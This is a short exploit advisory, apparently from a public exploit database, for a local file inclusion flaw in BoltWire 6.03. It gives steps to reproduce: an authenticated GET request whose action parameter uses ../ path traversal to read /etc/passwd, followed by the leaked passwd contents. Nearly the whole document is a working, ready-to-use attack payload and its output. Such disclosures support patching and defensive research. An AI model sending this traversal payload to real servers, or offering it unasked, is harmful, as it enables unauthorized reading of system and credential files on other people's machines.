@@ -1,0 +1,31 @@
+# Exploit Title: BoltWire 6.03 - Local File Inclusion
+# Date: 2020-05-02
+# Exploit Author: Andrey Stoykov
+# Vendor Homepage: https://www.boltwire.com/
+# Software Link: https://www.boltwire.com/downloads/go&v=6&r=03
+# Version: 6.03
+# Tested on: Ubuntu 20.04 LAMP
+
+
+LFI:
+
+Steps to Reproduce:
+
+1) Using HTTP GET request browse to the following page, whilst being authenticated user.
+http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd
+
+Result
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+[SNIPPED]
